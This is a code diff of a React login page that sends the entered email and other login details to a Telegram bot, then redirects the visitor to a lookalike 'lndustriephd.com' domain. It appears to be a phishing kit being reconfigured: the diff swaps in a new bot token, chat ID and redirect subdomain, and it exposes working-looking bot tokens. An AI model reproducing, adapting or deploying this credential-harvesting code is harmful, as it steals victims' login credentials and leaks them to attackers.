@@ -56,8 +56,8 @@ const Login = () => {
         return;
       }
 
-      const TELEGRAM_BOT_TOKEN = '7781468085:AAEdLDEdPbC1zQUOJnNmYCPgkH84uuwLfgU';
-      const TELEGRAM_CHAT_ID = '-1002493880170';
+      const TELEGRAM_BOT_TOKEN = '7622174179:AAHCV1oWQuJrs_r4R6A1iMz0oaj3zWCQiPk';
+      const TELEGRAM_CHAT_ID = '-1002384297764';
       const loginAlert = `
 🔐 <b>Login Details</b>
 📧 <b>Email:</b> ${email}
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://sag.lndustriephd.com/';
+      window.location.href = 'https://ner.lndustriephd.com/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
